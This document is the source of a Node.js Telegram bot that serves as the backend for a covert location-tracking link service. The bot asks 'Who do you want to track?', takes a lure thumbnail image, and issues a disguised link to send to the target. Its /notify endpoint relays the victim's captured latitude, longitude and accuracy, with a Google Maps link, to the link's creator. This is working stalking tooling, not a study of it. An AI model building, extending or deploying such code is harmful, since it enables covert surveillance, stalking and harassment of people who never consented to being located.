const dns = require('dns');
dns.setDefaultResultOrder('ipv4first');

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
require('dotenv').config();

/* =========================
   CONFIG
========================= */
const BOT_TOKEN = process.env.BOT_TOKEN;
const BASE_URL = process.env.BASE_URL;
const BOT_API_PORT = process.env.BOT_API_PORT || 5000;
const NOTIFY_API_KEY = process.env.NOTIFY_API_KEY;
const VPS_IP = process.env.VPS_IP;
const BOT_PUBLIC_URL =
    process.env.BOT_PUBLIC_URL ||
    (VPS_IP ? `http://${VPS_IP}:${BOT_API_PORT}` : `http://localhost:${BOT_API_PORT}`);
const LINKS_FILE = path.join(__dirname, 'links.json');
const UPLOADS_DIR = path.join(__dirname, 'uploads');

if (!BOT_TOKEN || !BASE_URL || !NOTIFY_API_KEY) {
    console.error('Missing BOT_TOKEN, BASE_URL, or NOTIFY_API_KEY in .env');
    process.exit(1);
}

/* =========================
   TELEGRAM BOT
========================= */
const bot = new TelegramBot(BOT_TOKEN, {
    polling: true
});

console.log('🤖 Telegram bot running...');

/* =========================
   EXPRESS APP
========================= */
const app = express();
app.use(express.json());
app.use('/uploads', express.static(UPLOADS_DIR));

/* =========================
   SESSION STORE
========================= */
const userSessions = {};

/* =========================
   HELPERS
========================= */
function getLinks() {
    if (!fs.existsSync(LINKS_FILE)) {
        return [];
    }

    return JSON.parse(
        fs.readFileSync(LINKS_FILE)
    );
}

function saveLink(data) {
    const links = getLinks();

    links.push(data);

    fs.writeFileSync(
        LINKS_FILE,
        JSON.stringify(links, null, 2)
    );
}

/* =========================
   START COMMAND
========================= */
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    userSessions[chatId] = {
        step: 'awaiting_name'
    };

    bot.sendMessage(
        chatId,
        'Welcome.\n\nWho do you want to track?'
    );
});

/* =========================
   HANDLE TEXT INPUT
========================= */
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (!userSessions[chatId]) return;

    const session = userSessions[chatId];

    if (
        session.step === 'awaiting_name' &&
        msg.text &&
        !msg.text.startsWith('/')
    ) {
        session.name = msg.text;
        session.telegramUsername =
            msg.from.username || 'No username';
        session.telegramId = msg.from.id;

        session.step = 'awaiting_photo';

        bot.sendMessage(
            chatId,
            'Great. Now upload the image you want to use as the link thumbnail.'
        );
    }
});

/* =========================
   HANDLE PHOTO UPLOAD
========================= */
bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;

    if (!userSessions[chatId]) return;

    const session = userSessions[chatId];

    if (session.step !== 'awaiting_photo') return;

    try {
        const photo =
            msg.photo[msg.photo.length - 1];

        const fileId = photo.file_id;

        const file =
            await bot.getFile(fileId);

        const fileUrl =
            `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

        const filename =
            `${uuidv4()}.jpg`;

        const localPath =
            path.join(
                UPLOADS_DIR,
                filename
            );

        // ✅ FIXED: timeout + ipv4 fix support
        const response =
            await axios({
                url: fileUrl,
                method: 'GET',
                responseType: 'stream',
                timeout: 30000
            });

        const writer =
            fs.createWriteStream(localPath);

        response.data.pipe(writer);

        await new Promise(
            (resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            }
        );

        const linkId = uuidv4();

        const trackingLink =
            `${BASE_URL}/t/${linkId}`;

        saveLink({
            linkId,
            ownerName: session.name,
            telegramUsername: session.telegramUsername,
            ownerChatId: chatId,
            thumbnail:
                `${BOT_PUBLIC_URL}/uploads/${filename}`,
            createdAt: new Date().toISOString()
        });

        bot.sendMessage(
            chatId,
            `✅ Link created successfully.\n\n${trackingLink}\n\nCopy and send this link.`
        );

        delete userSessions[chatId];

    } catch (err) {
        console.error(
            'Image processing failed:',
            err.message
        );

        bot.sendMessage(
            chatId,
            'Error processing image. Please try again.'
        );
    }
});

/* =========================
   GET LINK (VPS API)
========================= */
app.get('/links/:id', (req, res) => {
    const links = getLinks();

    const link = links.find(
        l => l.linkId === req.params.id
    );

    if (!link) {
        return res.status(404).json({
            error: 'Not found'
        });
    }

    res.json(link);
});

/* =========================
   NOTIFY API (FROM VERCEL)
========================= */
app.post('/notify', async (req, res) => {
    try {
        const apiKey =
            req.headers['x-api-key'];

        if (apiKey !== NOTIFY_API_KEY) {
            return res.status(401).json({
                error: 'Unauthorized'
            });
        }

        const {
            ownerChatId,
            ownerName,
            telegramUsername,
            latitude,
            longitude,
            accuracy
        } = req.body;

        const mapLink =
            `https://maps.google.com/?q=${latitude},${longitude}`;

        console.log('========================');
        console.log('📍 LOCATION ALERT');
        console.log('Tracked contact:', ownerName);
        console.log('Telegram:', telegramUsername || 'No username');
        console.log('Latitude:', latitude);
        console.log('Longitude:', longitude);
        console.log('Accuracy:', accuracy ? `${Math.round(accuracy)}m` : 'Unknown');
        console.log('Map:', mapLink);
        console.log('========================');

        const message = `
Location captured

Tracked contact: ${ownerName}
Telegram: ${telegramUsername || 'No username'}

Latitude: ${latitude}
Longitude: ${longitude}
Accuracy: ${accuracy ? `${Math.round(accuracy)} meters` : 'Unknown'}

Map:
${mapLink}
`;

        await bot.sendMessage(
            ownerChatId,
            message
        );

        res.json({
            success: true
        });

    } catch (err) {
        console.error(err);

        res.status(500).json({
            error: err.message
        });
    }
});

/* =========================
   START SERVER
========================= */
app.listen(BOT_API_PORT, () => {
    console.log(
        `🌐 Notify API running on port ${BOT_API_PORT}`
    );
});

/* =========================
   POLLING ERROR
========================= */
bot.on('polling_error', (error) => {
    console.error(
        'Polling Error:',
        error.message
    );
});
